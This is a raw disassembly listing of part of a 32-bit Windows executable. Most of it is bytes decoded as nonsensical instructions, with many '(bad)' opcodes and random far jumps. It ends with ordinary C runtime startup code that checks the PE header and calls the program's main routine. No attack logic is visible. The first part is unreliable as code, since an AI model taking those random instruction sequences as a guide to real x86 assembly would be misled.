  42232e:	mov    ebx,0x5806a8f5
  422333:	xchg   edx,eax
  422334:	out    dx,eax
  422335:	(bad)  
  422336:	adc    bl,BYTE PTR [ebp+0x12bff213]
  42233c:	mov    ah,0x20
  42233e:	scas   eax,DWORD PTR es:[edi]
  42233f:	adc    DWORD PTR [eax],ebp
  422341:	fsub   DWORD PTR [edx+0x2b]
  422344:	aad    0xd1
  422346:	mov    ebx,0xfc71ce21
  42234b:	mov    ah,0x13
  42234d:	je     0x422353
  42234f:	jne    0x4222df
  422351:	leave  
  422352:	pop    esi
  422353:	mov    esi,0x5ff62446
  422358:	and    eax,0x55bbd239
  42235d:	retf   0x3c0d
  422360:	shl    ecx,cl
  422362:	cld    
  422363:	sub    cl,BYTE PTR [eax]
  422365:	mov    ecx,0x29451e76
  42236a:	test   al,0x23
  42236c:	cmp    esi,DWORD PTR [edi+0x3a]
  42236f:	sbb    BYTE PTR [ecx+edi*8],cl
  422372:	fst    QWORD PTR [ecx+edx*2]
  422375:	daa    
  422376:	retf   
  422377:	xchg   DWORD PTR [ebp+0x4],esi
  42237a:	sub    esi,DWORD PTR [ecx+0xd6a90dd]
  422380:	or     bh,0xfe
  422383:	sar    BYTE PTR [ebx+0x6f],1
  422386:	mov    BYTE PTR [edi-0x17],dh
  422389:	(bad)  
  42238a:	fstp   QWORD PTR [edi]
  42238c:	adc    DWORD PTR [edi+eax*8+0x196adfce],edi
  422393:	stos   DWORD PTR es:[edi],eax
  422394:	push   cs
  422395:	fld    DWORD PTR [edx]
  422398:	aaa    
  422399:	inc    esp
  42239a:	popf   
  42239b:	popf   
  42239c:	fstp   st(4)
  42239e:	jb     0x422349
  4223a0:	cld    
  4223a1:	or     al,0x34
  4223a3:	pop    ecx
  4223a4:	div    DWORD PTR ds:0x44012ca2
  4223aa:	push   0xe9509602
  4223af:	div    DWORD PTR [ebx]
  4223b1:	shl    BYTE PTR [ebx],0x5b
  4223b4:	outs   dx,BYTE PTR ds:[esi]
  4223b5:	aad    0xe1
  4223b7:	je     0x42236e
  4223b9:	or     ebp,DWORD PTR [ebx+eiz*8]
  4223bc:	inc    esi
  4223bd:	dec    eax
  4223be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4223bf:	bound  edi,QWORD PTR [ebp-0x26]
  4223c2:	pop    ss
  4223c3:	dec    ebx
  4223c4:	xchg   edx,eax
  4223c5:	jp     0x422405
  4223c7:	pusha  
  4223c8:	cmp    eax,edx
  4223ca:	pop    edi
  4223cb:	in     al,0x7e
  4223cd:	push   ebp
  4223ce:	fmul   DWORD PTR [ebx-0x439269d1]
  4223d4:	mov    WORD PTR [ebx],?
  4223d6:	pop    edi
  4223d7:	and    eax,0x11decce
  4223dc:	add    ch,BYTE PTR [ebp-0x5e]
  4223df:	jb     0x4223f5
  4223e1:	fidivr DWORD PTR [ebx]
  4223e3:	mov    eax,ds:0x8bf60c2b
  4223e8:	mov    WORD PTR [edi-0x64597387],cs
  4223ee:	push   esi
  4223f0:	data16 or al,0x26
  4223f3:	jnp    0x42243c
  4223f5:	ficom  WORD PTR ds:0x6c04ffe
  4223fb:	fnstcw WORD PTR es:[ebx+0x26b42fe1]
  422402:	nop
  422403:	fadd   QWORD PTR [edi+eax*4-0x3f4089bf]
  42240a:	cmp    BYTE PTR [edi],dl
  42240c:	jnp    0x422440
  42240e:	push   edi
  42240f:	(bad)  
  422410:	shr    BYTE PTR [edx+0x9],1
  422413:	daa    
  422414:	and    al,0xe9
  422416:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422417:	mov    ah,0x85
  422419:	push   ss
  42241a:	bound  edx,QWORD PTR [ecx]
  42241c:	icebp  
  42241d:	ins    DWORD PTR es:[edi],dx
  42241e:	jbe    0x4223a7
  422420:	adc    bl,BYTE PTR [ebp-0x66]
  422423:	int3   
  422424:	push   eax
  422425:	xchg   ebx,eax
  422426:	nop
  422427:	test   al,0x3f
  422429:	add    eax,0xb63dbc6c
  42242e:	rcl    dl,0x84
  422431:	pop    esi
  422432:	dec    esi
  422433:	scas   al,BYTE PTR es:[edi]
  422434:	cmp    bl,BYTE PTR [ebp-0x70]
  422437:	jnp    0x4223f8
  422439:	fcomp  DWORD PTR [ebp+0x77]
  42243c:	cmp    eax,0xdea6c149
  422441:	jo     0x42246b
  422443:	sub    DWORD PTR fs:[eax-0x23149fa8],esi
  42244a:	push   ds
  42244b:	jns    0x42247c
  42244d:	adc    ebp,0x90f7074e
  422453:	out    dx,al
  422454:	xchg   DWORD PTR [eax],ecx
  422456:	sar    DWORD PTR [edx-0x9dd7552],1
  42245c:	mov    ebp,0xfbbb132e
  422461:	and    DWORD PTR [edi+0x1a],ecx
  422464:	mov    ecx,0xa88d0997
  422469:	push   ebx
  42246a:	mov    al,ds:0x9702d6d5
  42246f:	mov    bh,0x93
  422471:	xor    BYTE PTR [edi+0x7f],dl
  422474:	mov    eax,0x3fbc0294
  422479:	dec    esi
  42247a:	test   al,0xfb
  42247c:	mov    ecx,0xe7226d85
  422481:	cli    
  422482:	outs   dx,DWORD PTR ds:[esi]
  422483:	fbstp  TBYTE PTR cs:0x2876a
  42248a:	jno    0x42242a
  42248c:	jnp    0x42241e
  42248e:	and    eax,0xced94270
  422493:	push   esp
  422494:	out    0x2f,eax
  422496:	call   0x3b9e:0x441953a7
  42249d:	sar    BYTE PTR [edx+esi*2+0x39],1
  4224a1:	mov    ch,0x71
  4224a3:	aaa    
  4224a4:	and    BYTE PTR [esi-0x4],ah
  4224a7:	push   0xfffffff6
  4224a9:	ins    DWORD PTR es:[edi],dx
  4224aa:	scas   al,BYTE PTR es:[edi]
  4224ab:	push   cs
  4224ac:	xor    esp,DWORD PTR [ebp-0x7233bcab]
  4224b2:	pop    edx
  4224b3:	(bad)  
  4224b4:	std    
  4224b5:	pop    ss
  4224b6:	dec    edx
  4224b7:	add    al,0x57
  4224b9:	inc    ebp
  4224ba:	in     al,0x15
  4224bc:	fmul   QWORD PTR [edx+0x34152bbc]
  4224c2:	in     al,0x99
  4224c4:	adc    ebx,DWORD PTR [edx]
  4224c6:	or     ch,BYTE PTR [edx+edx*4]
  4224c9:	and    DWORD PTR [eax+eax*2+0x67],edi
  4224cd:	sti    
  4224ce:	push   es
  4224cf:	dec    edi
  4224d0:	fild   QWORD PTR [esi+0xb70b65c]
  4224d6:	(bad)  
  4224d7:	cmp    eax,0xf39d2b4
  4224dc:	jmp    0x7b71f5f1
  4224e1:	adc    al,0x4f
  4224e3:	jle    0x42254a
  4224e5:	lds    esi,FWORD PTR [ecx+eax*8+0x3d]
  4224e9:	leave  
  4224ea:	mov    ah,BYTE PTR [eax+0x37]
  4224ed:	repnz pop ecx
  4224ef:	adc    ebx,0x16
  4224f2:	div    esp
  4224f4:	or     DWORD PTR [eax-0x6b],ebp
  4224f7:	or     ah,BYTE PTR [esi-0x40322007]
  4224fd:	xor    esi,eax
  4224ff:	fist   DWORD PTR ds:0x24ab5a0d
  422505:	push   ebx
  422506:	(bad)  
  422507:	sbb    DWORD PTR [edx+0x1bc8cdbf],esp
  42250d:	test   eax,0x361fedc7
  422512:	adc    al,0x52
  422514:	popf   
  422515:	cmp    ecx,DWORD PTR [esp+edx*2-0x80]
  422519:	jmp    0x422545
  42251b:	cmp    al,0xe6
  42251d:	pop    ds
  42251e:	out    0x8e,eax
  422520:	pop    es
  422521:	dec    esi
  422522:	aad    0x43
  422524:	or     BYTE PTR [ebx+0x26],al
  422527:	repz dec DWORD PTR [edx+0x6748e3]
  42252e:	and    al,0x37
  422530:	cwde   
  422531:	sub    ecx,DWORD PTR [ebx-0x22f47b57]
  422537:	dec    ebp
  422538:	mov    bl,0xf6
  42253a:	mov    bl,0xa2
  42253c:	mov    eax,ds:0xae75c7b9
  422541:	mov    eax,0x69f3eeb3
  422546:	icebp  
  422547:	inc    ecx
  422548:	sbb    DWORD PTR [edx+eax*2],ebp
  42254b:	sub    eax,0x525e9c4c
  422550:	pop    ds
  422551:	sbb    DWORD PTR [eax+esi*4-0x5a19f266],eax
  422558:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422559:	pop    edi
  42255a:	add    DWORD PTR ds:0xe2a5764d,0x4c
  422561:	ja     0x42252f
  422563:	jno    0x422535
  422565:	cld    
  422566:	fdiv   QWORD PTR [esi-0x2]
  422569:	mov    ds:0xb04975b1,al
  42256e:	call   0xeaf8:0x1e5c173b
  422575:	stos   DWORD PTR es:[edi],eax
  422576:	push   ebx
  422577:	and    al,0x82
  422579:	fs pop eax
  42257b:	cmp    al,0x85
  42257d:	lahf   
  42257e:	rcl    DWORD PTR [ecx+0x1],0x1
  422582:	and    esp,DWORD PTR [edx+eax*1]
  422585:	in     al,0x4e
  422587:	mov    bl,0xfe
  422589:	call   DWORD PTR [ebp+0x3f]
  42258c:	sub    BYTE PTR [eax+0x7],cl
  42258f:	mov    dl,0x8f
  422591:	dec    ecx
  422592:	repz mov ch,0xb5
  422595:	pop    ss
  422596:	cmp    DWORD PTR [ebx],ebp
  422598:	(bad)  
  422599:	cs pop ss
  42259b:	jecxz  0x422609
  42259d:	mov    esi,0xd8db8c6b
  4225a2:	daa    
  4225a3:	inc    ebx
  4225a4:	mov    dh,0x4f
  4225a6:	mov    ah,0xcc
  4225a8:	mov    esp,DWORD PTR [ebx+ebp*4]
  4225ab:	ins    BYTE PTR es:[edi],dx
  4225ac:	push   es
  4225ad:	push   0xf8f30b82
  4225b2:	into   
  4225b3:	sahf   
  4225b4:	test   eax,0xc86d4b15
  4225b9:	test   BYTE PTR [ebp-0x39],0xbb
  4225bd:	out    0x90,al
  4225bf:	pop    edi
  4225c0:	push   0xffffff81
  4225c2:	les    edi,FWORD PTR [ecx+0x23]
  4225c5:	cmp    BYTE PTR [edx-0x2db6dbd1],al
  4225cb:	cwde   
  4225cc:	inc    esp
  4225cd:	adc    al,0x2c
  4225cf:	jmp    0x4225da
  4225d1:	cmp    al,0xff
  4225d3:	jl     0x422595
  4225d5:	jge    0x4225c2
  4225d7:	lods   al,BYTE PTR ds:[esi]
  4225d8:	pop    edx
  4225d9:	mov    cl,0x3e
  4225db:	cmp    al,0x83
  4225dd:	sbb    eax,0x27748f4c
  4225e2:	xchg   BYTE PTR [ecx-0x10],cl
  4225e5:	test   DWORD PTR [ecx-0x1f],esi
  4225e8:	ds mov eax,0xc3d55486
  4225ee:	pop    ecx
  4225ef:	ret    0xc7c5
  4225f2:	sbb    DWORD PTR [eax+0x48],eax
  4225f5:	inc    di
  4225f7:	mov    ecx,0x809ea3fb
  4225fc:	rol    ebx,cl
  4225fe:	sti    
  4225ff:	adc    al,BYTE PTR [ebp-0x13]
  422602:	test   edx,0x401c7ddc
  422608:	les    edi,FWORD PTR [ecx+0x34]
  42260b:	sub    ebx,DWORD PTR [edx]
  42260d:	fwait
  42260e:	jle    0x4225cc
  422610:	outs   dx,BYTE PTR ds:[esi]
  422611:	or     al,0x71
  422613:	mov    eax,ds:0xce0ccf8
  422618:	lods   eax,DWORD PTR ds:[esi]
  422619:	or     ebp,ecx
  42261b:	jo     0x42269b
  42261d:	mov    esi,DWORD PTR [edi+0x55]
  422620:	rcr    BYTE PTR [esi-0x19],1
  422623:	adc    esi,DWORD PTR [ebx+ebx*2+0x4006a853]
  42262a:	jne    0x422682
  42262c:	dec    eax
  42262d:	cli    
  42262e:	cli    
  42262f:	sub    DWORD PTR ds:0x4635d277,ebp
  422635:	pop    ss
  422636:	xor    BYTE PTR [eax+edi*1-0x1d6cda20],ch
  42263d:	sub    esp,DWORD PTR [edi-0x7c]
  422640:	add    ecx,DWORD PTR [ecx+0x147e8ffc]
  422646:	push   eax
  422647:	jmp    0x3658:0x9249cd57
  42264e:	(bad)  
  42264f:	rcr    BYTE PTR [eax+0x22],1
  422652:	(bad)  [esi+esi*4+0x55c199eb]
  422659:	outs   dx,BYTE PTR ds:[esi]
  42265a:	fimul  DWORD PTR [edx-0x62]
  42265d:	mov    cl,0xff
  42265f:	(bad)  
  422661:	cld    
  422662:	fdiv   DWORD PTR [edi-0x1b]
  422665:	in     al,0x30
  422667:	lods   al,BYTE PTR ds:[esi]
  422668:	jp     0x422657
  42266a:	ds gs pop ecx
  42266d:	push   eax
  42266e:	dec    ebx
  42266f:	or     al,0x8c
  422671:	jg     0x422666
  422673:	cli    
  422674:	test   eax,0xe42aeacd
  422679:	pop    ecx
  42267a:	add    eax,0x92a5d482
  42267f:	or     ch,al
  422681:	cld    
  422682:	imul   ecx,DWORD PTR [edi+0x26c2d1ba],0x44
  422689:	outs   dx,BYTE PTR ds:[esi]
  42268a:	sub    eax,0x6ef5cee1
  42268f:	js     0x4226d6
  422691:	lahf   
  422692:	cmp    ah,BYTE PTR [ecx+0x16]
  422695:	iret   
  422696:	adc    al,0xed
  422698:	in     al,0xc1
  42269a:	adc    bl,cl
  42269c:	push   ecx
  42269d:	xor    dh,0x21
  4226a0:	(bad)  [ebx-0x70ea5c37]
  4226a6:	xor    al,0x64
  4226a8:	xor    al,0x74
  4226aa:	push   ds
  4226ab:	jbe    0x42272c
  4226ad:	pop    ss
  4226ae:	inc    eax
  4226af:	loop   0x42267e
  4226b1:	add    al,0x93
  4226b3:	mov    ebp,0x71b7afd4
  4226b8:	jge    0x422731
  4226ba:	dec    ecx
  4226bb:	cmc    
  4226bc:	sub    BYTE PTR [edx-0x6f],cl
  4226bf:	divps  xmm3,XMMWORD PTR [edx]
  4226c2:	loop   0x42273b
  4226c4:	mov    eax,esp
  4226c6:	adc    edx,esi
  4226c8:	dec    eax
  4226c9:	push   ss
  4226ca:	adc    al,0xf6
  4226cc:	aaa    
  4226cd:	mov    DWORD PTR [edx-0x5dc865c2],eax
  4226d3:	or     esp,edi
  4226d5:	in     al,0x4c
  4226d7:	mov    bh,0xb2
  4226d9:	je     0x42275a
  4226db:	push   eax
  4226dc:	pushf  
  4226dd:	xchg   BYTE PTR [edx+0x14],cl
  4226e0:	xchg   ecx,eax
  4226e1:	lea    eax,[esi]
  4226e3:	mov    ch,0x92
  4226e5:	hlt    
  4226e6:	adc    esi,ebx
  4226e8:	les    ebx,FWORD PTR [edx-0x55]
  4226eb:	push   eax
  4226ec:	icebp  
  4226ed:	jbe    0x4226cc
  4226ef:	add    eax,0x438f2b8f
  4226f4:	int3   
  4226f5:	retf   0x9b7f
  4226f8:	dec    ecx
  4226f9:	cmp    BYTE PTR [ebx-0x79d9db6f],0xf8
  422700:	jo     0x4226a1
  422702:	mov    ah,0xd9
  422704:	push   esi
  422705:	push   ss
  422706:	repnz fidivr WORD PTR [ebx-0x3e]
  42270a:	in     al,dx
  42270b:	xchg   DWORD PTR [ebp-0x3c02f0ba],ebx
  422711:	int    0x82
  422713:	xchg   ecx,eax
  422714:	int3   
  422715:	add    eax,0x2dc74424
  42271a:	pop    ebx
  42271b:	rcr    BYTE PTR [ecx],cl
  42271d:	sbb    BYTE PTR [edi+edi*1+0x76ca86f3],ch
  422724:	dec    esp
  422725:	adc    al,0x5c
  422727:	mov    eax,ds:0xe248a1a9
  42272c:	xchg   esp,eax
  42272d:	(bad)  
  42272e:	xor    edi,DWORD PTR [edi]
  422730:	cmp    DWORD PTR [esi-0x64ef4202],eax
  422736:	jp     0x4226bd
  422738:	push   edi
  422739:	ss push esp
  42273b:	mov    eax,0xeb9c6424
  422740:	add    ebp,DWORD PTR [esi]
  422742:	test   ch,bh
  422744:	mov    eax,ds:0xc6c13162
  422749:	call   0x5eff:0xcb91ee41
  422750:	fwait
  422751:	sub    eax,0xb3474222
  422756:	out    0xb3,al
  422758:	and    cl,BYTE PTR [ebx]
  42275a:	scas   eax,DWORD PTR es:[edi]
  42275b:	sub    BYTE PTR [eax-0x5f],cl
  42275e:	push   eax
  42275f:	push   ecx
  422760:	push   eax
  422761:	jns    0x4227bd
  422763:	xchg   esp,eax
  422764:	mov    ecx,0xa42cf525
  422769:	sar    DWORD PTR [edi-0x1c],cl
  42276c:	loopne 0x42272d
  42276e:	add    al,0x81
  422770:	jnp    0x4227ce
  422772:	(bad)  
  422773:	sti    
  422774:	mov    eax,0x7036d7a0
  422779:	div    DWORD PTR [ebx]
  42277b:	fnstsw WORD PTR [esi+0x47]
  42277e:	cmp    cl,BYTE PTR [edi+0x53425133]
  422784:	aaa    
  422785:	ds push ebp
  422787:	call   0xd5cc:0xe3885bbf
  42278e:	cdq    
  42278f:	repnz shl DWORD PTR [eax],1
  422792:	int    0x12
  422794:	rcl    ebx,cl
  422796:	xchg   edi,eax
  422797:	mov    BYTE PTR cs:[ecx],bh
  42279a:	imul   esi,DWORD PTR [edi+0x505e0eec],0x2c
  4227a1:	pop    ebx
  4227a2:	pop    ecx
  4227a3:	int3   
  4227a4:	shl    BYTE PTR [edi-0x34],0xaa
  4227a8:	dec    edx
  4227a9:	push   DWORD PTR [edi]
  4227ab:	cmc    
  4227ac:	lock adc dl,BYTE PTR [edx-0x1f6cf7a8]
  4227b3:	sbb    esi,DWORD PTR [esi-0x2d]
  4227b6:	jp     0x4227df
  4227b8:	cs mov al,0xac
  4227bb:	shr    cl,cl
  4227bd:	ja     0x4227e3
  4227bf:	arpl   WORD PTR [ecx],bp
  4227c1:	in     al,0xcf
  4227c3:	xor    BYTE PTR [esi-0x45],bl
  4227c6:	push   es
  4227c7:	lods   al,BYTE PTR ds:[esi]
  4227c8:	lahf   
  4227c9:	sub    DWORD PTR [ecx+ebp*1-0x51],0xffffffb9
  4227ce:	or     ebx,edx
  4227d0:	xor    BYTE PTR ds:0xb416fa7d,dh
  4227d6:	cdq    
  4227d7:	retf   0xe564
  4227da:	loopne 0x42283f
  4227dc:	jmp    0x8d03:0xea8958db
  4227e3:	pusha  
  4227e4:	sahf   
  4227e5:	out    dx,al
  4227e6:	and    eax,DWORD PTR ds:0x8fa5b351
  4227ec:	(bad)  
  4227ed:	outs   dx,DWORD PTR ds:[esi]
  4227ee:	cmp    BYTE PTR [ebp+0x35b2d3a9],dl
  4227f4:	pusha  
  4227f5:	and    DWORD PTR [ecx],edi
  4227f7:	repnz data16 dec BYTE PTR [edi]
  4227fb:	xor    esp,DWORD PTR [esi-0x457f2054]
  422801:	add    bl,ah
  422803:	cmc    
  422804:	pop    es
  422805:	mov    eax,ds:0xf6a8209b
  42280a:	iret   
  42280b:	mov    edx,0x6f455f2b
  422810:	xor    edx,ecx
  422812:	in     al,dx
  422813:	jb     0x4227e6
  422815:	push   ss
  422816:	int    0x10
  422818:	iret   
  422819:	popa   
  42281a:	dec    ebp
  42281b:	push   cs
  42281c:	mov    gs:0xc9ac5ffb,al
  422822:	sbb    al,0x18
  422824:	inc    ebx
  422825:	mov    cl,0x28
  422827:	pop    ds
  422828:	fdivr  st,st(0)
  42282a:	add    BYTE PTR [edx+0x53],al
  42282d:	(bad)  
  42282f:	in     al,0x42
  422831:	and    dh,BYTE PTR [ebx-0x6d]
  422834:	pop    eax
  422835:	cmp    edx,DWORD PTR ds:0xffff51f4
  42283b:	mov    DWORD PTR [eax-0x43],esp
  42283e:	mov    bh,0x34
  422840:	inc    esp
  422841:	shr    DWORD PTR [esi-0x56844c44],0xfe
  422848:	jge    0x42286e
  42284a:	les    ebx,FWORD PTR [esi+eax*8+0x79]
  42284e:	rcr    dl,1
  422850:	cld    
  422851:	jns    0x422810
  422853:	test   DWORD PTR [esi+0x57],ebp
  422856:	lods   al,BYTE PTR ds:[esi]
  422857:	dec    eax
  422858:	mov    WORD PTR [edi],gs
  42285a:	stos   DWORD PTR es:[edi],eax
  42285b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42285c:	cmp    BYTE PTR [ebp+0x65ae6e8b],ch
  422862:	js     0x422809
  422864:	jns    0x42286a
  422866:	(bad)  
  422867:	cs jae 0x4227f8
  42286a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42286b:	mov    ah,0xae
  42286d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42286e:	imul   edx,DWORD PTR [edx-0x5e],0xffffffba
  422872:	dec    eax
  422873:	add    DWORD PTR [ecx-0x31f156e9],edi
  422879:	lds    ecx,FWORD PTR [esi]
  42287b:	in     eax,dx
  42287c:	ins    DWORD PTR es:[edi],dx
  42287d:	ficom  DWORD PTR [ebx-0x14b4d040]
  422883:	or     ecx,DWORD PTR [esi+ebp*4+0x4a]
  422887:	dec    BYTE PTR [esi]
  422889:	dec    edi
  42288a:	jns    0x4228fc
  42288c:	ja     0x42288b
  42288e:	jmp    0xd29:0xf2ac99b8
  422895:	mov    ebp,0xfbd7abf9
  42289a:	sbb    ebx,ebx
  42289c:	push   edx
  42289d:	fistp  QWORD PTR [edx-0x5d]
  4228a0:	inc    ebx
  4228a1:	loop   0x4228cd
  4228a3:	fs pop ebx
  4228a5:	out    dx,eax
  4228a6:	pop    ds
  4228a7:	sub    al,0x6c
  4228a9:	ror    DWORD PTR [edx],0x80
  4228ac:	pushf  
  4228ad:	imul   ebp,DWORD PTR [edi+0x54],0x8
  4228b1:	push   esp
  4228b2:	mov    ebp,DWORD PTR [esi]
  4228b4:	mul    BYTE PTR [ecx+0x41]
  4228b7:	adc    dl,BYTE PTR [esi+0x64c25ac8]
  4228bd:	inc    edi
  4228be:	jl     0x4228ff
  4228c0:	js     0x4228d6
  4228c2:	rol    DWORD PTR [ecx+0x31],cl
  4228c5:	xchg   ecx,eax
  4228c6:	pusha  
  4228c7:	xchg   ebx,eax
  4228c8:	sub    al,0x5f
  4228ca:	pop    edx
  4228cb:	fnsave [ebx-0x51c67407]
  4228d1:	int    0x8
  4228d3:	hlt    
  4228d4:	pushf  
  4228d5:	rcl    BYTE PTR [edi+esi*1+0x3],cl
  4228d9:	ja     0x422957
  4228db:	pop    edi
  4228dc:	pop    ebx
  4228dd:	int3   
  4228de:	mov    dl,0x92
  4228e0:	jb     0x422897
  4228e2:	shl    DWORD PTR [ebx-0x4dc83cb8],cl
  4228e8:	xchg   ebx,eax
  4228e9:	test   BYTE PTR [esi],bl
  4228eb:	mov    ecx,0xb160fc2e
  4228f0:	scas   al,BYTE PTR es:[edi]
  4228f1:	inc    ecx
  4228f2:	sub    al,0x9e
  4228f4:	mov    edx,0xaa72951f
  4228f9:	jno    0x4228e1
  4228fb:	in     al,0xfc
  4228fd:	xor    eax,0x66880ae3
  422902:	dec    esp
  422903:	and    dx,WORD PTR [edi-0x224c933c]
  42290a:	data16 arpl si,cx
  42290d:	out    0x92,eax
  42290f:	mov    esp,0x1408fab1
  422914:	push   esi
  422916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422917:	out    0xed,al
  422919:	dec    ebx
  42291a:	not    cl
  42291c:	xor    al,0x78
  42291e:	xchg   BYTE PTR [esi],cl
  422920:	pop    es
  422921:	mov    esp,0x9171f297
  422926:	xor    eax,0x13d51122
  42292b:	mov    BYTE PTR [esi-0x233e9be9],bl
  422931:	xchg   esp,eax
  422932:	rcl    BYTE PTR [ecx+0x1e4e0279],cl
  422938:	test   DWORD PTR [ebp-0x7e2abeca],edi
  42293e:	lods   al,BYTE PTR ds:[esi]
  42293f:	idiv   DWORD PTR [edx+0x1ed6d260]
  422945:	push   ds
  422946:	jmp    0xbe0d:0xc7b2d452
  42294d:	jle    0x422980
  42294f:	leave  
  422950:	sbb    ch,0x9a
  422953:	push   ebp
  422954:	test   ecx,edx
  422956:	ror    BYTE PTR [esp+ebx*4+0x65],cl
  42295a:	xor    eax,eax
  42295c:	add    esp,0x10
  42295f:	ret    0x10
  422962:	nop
  422963:	nop
  422964:	nop
  422965:	nop
  422966:	nop
  422967:	nop
  422968:	nop
  422969:	nop
  42296a:	nop
  42296b:	nop
  42296c:	nop
  42296d:	nop
  42296e:	nop
  42296f:	nop
  422970:	cmp    DWORD PTR ds:0x45cabc,0x1
  422977:	jne    0x42297e
  422979:	call   0x422ebc
  42297e:	push   DWORD PTR [esp+0x4]
  422982:	call   0x422d45
  422987:	push   0xff
  42298c:	call   DWORD PTR ds:0x45c1c0
  422992:	pop    ecx
  422993:	pop    ecx
  422994:	ret    
  422995:	cmp    DWORD PTR ds:0x45cabc,0x1
  42299c:	jne    0x4229a3
  42299e:	call   0x422ebc
  4229a3:	push   DWORD PTR [esp+0x4]
  4229a7:	call   0x422d45
  4229ac:	push   0xff
  4229b1:	call   0x422b8b
  4229b6:	pop    ecx
  4229b7:	pop    ecx
  4229b8:	ret    
  4229b9:	push   0x60
  4229bb:	push   0x428118
  4229c0:	call   0x4238a8
  4229c5:	mov    edi,0x94
  4229ca:	mov    eax,edi
  4229cc:	call   0x423900
  4229d1:	mov    DWORD PTR [ebp-0x18],esp
  4229d4:	mov    esi,esp
  4229d6:	mov    DWORD PTR [esi],edi
  4229d8:	push   esi
  4229d9:	call   DWORD PTR ds:0x428028
  4229df:	mov    ecx,DWORD PTR [esi+0x10]
  4229e2:	mov    DWORD PTR ds:0x45cac4,ecx
  4229e8:	mov    eax,DWORD PTR [esi+0x4]
  4229eb:	mov    ds:0x45cad0,eax
  4229f0:	mov    edx,DWORD PTR [esi+0x8]
  4229f3:	mov    DWORD PTR ds:0x45cad4,edx
  4229f9:	mov    esi,DWORD PTR [esi+0xc]
  4229fc:	and    esi,0x7fff
  422a02:	mov    DWORD PTR ds:0x45cac8,esi
  422a08:	cmp    ecx,0x2
  422a0b:	je     0x422a19
  422a0d:	or     esi,0x8000
  422a13:	mov    DWORD PTR ds:0x45cac8,esi
  422a19:	shl    eax,0x8
  422a1c:	add    eax,edx
  422a1e:	mov    ds:0x45cacc,eax
  422a23:	xor    esi,esi
  422a25:	push   esi
  422a26:	mov    edi,DWORD PTR ds:0x428018
  422a2c:	call   edi
  422a2e:	cmp    WORD PTR [eax],0x5a4d
  422a33:	jne    0x422a54
  422a35:	mov    ecx,DWORD PTR [eax+0x3c]
  422a38:	add    ecx,eax
  422a3a:	cmp    DWORD PTR [ecx],0x4550
  422a40:	jne    0x422a54
  422a42:	movzx  eax,WORD PTR [ecx+0x18]
  422a46:	cmp    eax,0x10b
  422a4b:	je     0x422a6c
  422a4d:	cmp    eax,0x20b
  422a52:	je     0x422a59
  422a54:	mov    DWORD PTR [ebp-0x1c],esi
  422a57:	jmp    0x422a80
  422a59:	cmp    DWORD PTR [ecx+0x84],0xe
  422a60:	jbe    0x422a54
  422a62:	xor    eax,eax
  422a64:	cmp    DWORD PTR [ecx+0xf8],esi
  422a6a:	jmp    0x422a7a
  422a6c:	cmp    DWORD PTR [ecx+0x74],0xe
  422a70:	jbe    0x422a54
  422a72:	xor    eax,eax
  422a74:	cmp    DWORD PTR [ecx+0xe8],esi
  422a7a:	setne  al
  422a7d:	mov    DWORD PTR [ebp-0x1c],eax
  422a80:	push   0x1
  422a82:	call   0x423857
  422a87:	pop    ecx
  422a88:	test   eax,eax
  422a8a:	jne    0x422a94
  422a8c:	push   0x1c
  422a8e:	call   0x422995
  422a93:	pop    ecx
  422a94:	call   0x4237ce
  422a99:	test   eax,eax
  422a9b:	jne    0x422aa5
  422a9d:	push   0x10
  422a9f:	call   0x422995
  422aa4:	pop    ecx
  422aa5:	call   0x4236b7
  422aaa:	mov    DWORD PTR [ebp-0x4],esi
  422aad:	call   0x4234b9
  422ab2:	test   eax,eax
  422ab4:	jge    0x422abe
  422ab6:	push   0x1b
  422ab8:	call   0x422970
  422abd:	pop    ecx
  422abe:	call   DWORD PTR ds:0x428024
  422ac4:	mov    ds:0x45d274,eax
  422ac9:	call   0x423397
  422ace:	mov    ds:0x45cab4,eax
  422ad3:	call   0x4232f5
  422ad8:	test   eax,eax
  422ada:	jge    0x422ae4
  422adc:	push   0x8
  422ade:	call   0x422970
  422ae3:	pop    ecx
  422ae4:	call   0x4230c2
  422ae9:	test   eax,eax
  422aeb:	jge    0x422af5
  422aed:	push   0x9
  422aef:	call   0x422970
  422af4:	pop    ecx
  422af5:	call   0x422bcd
  422afa:	mov    DWORD PTR [ebp-0x20],eax
  422afd:	cmp    eax,esi
  422aff:	je     0x422b08
  422b01:	push   eax
  422b02:	call   0x422970
  422b07:	pop    ecx
  422b08:	mov    DWORD PTR [ebp-0x38],esi
  422b0b:	lea    eax,[ebp-0x64]
  422b0e:	push   eax
  422b0f:	call   DWORD PTR ds:0x428020
  422b15:	call   0x423059
  422b1a:	mov    DWORD PTR [ebp-0x68],eax
  422b1d:	test   BYTE PTR [ebp-0x38],0x1
  422b21:	je     0x422b29
  422b23:	movzx  eax,WORD PTR [ebp-0x34]
  422b27:	jmp    0x422b2c
  422b29:	push   0xa
  422b2b:	pop    eax
  422b2c:	push   eax
  422b2d:	push   DWORD PTR [ebp-0x68]
  422b30:	push   esi
  422b31:	push   esi
  422b32:	call   edi
  422b34:	push   eax
  422b35:	call   0x421800
  422b3a:	mov    edi,eax
  422b3c:	mov    DWORD PTR [ebp-0x6c],edi
  422b3f:	cmp    DWORD PTR [ebp-0x1c],esi
  422b42:	jne    0x422b4a
  422b44:	push   edi
  422b45:	call   0x422d05
  422b4a:	call   0x422d27
  422b4f:	jmp    0x422b7c
  422b51:	mov    eax,DWORD PTR [ebp-0x14]
  422b54:	mov    ecx,DWORD PTR [eax]
  422b56:	mov    ecx,DWORD PTR [ecx]
  422b58:	mov    DWORD PTR [ebp-0x70],ecx
  422b5b:	push   eax
  422b5c:	push   ecx
  422b5d:	call   0x422ef5
  422b62:	pop    ecx
  422b63:	pop    ecx
  422b64:	ret    
  422b65:	mov    esp,DWORD PTR [ebp-0x18]
  422b68:	mov    edi,DWORD PTR [ebp-0x70]
  422b6b:	cmp    DWORD PTR [ebp-0x1c],0x0
  422b6f:	jne    0x422b77
  422b71:	push   edi
  422b72:	call   0x422d16
  422b77:	call   0x422d36
  422b7c:	or     DWORD PTR [ebp-0x4],0xffffffff
  422b80:	mov    eax,edi
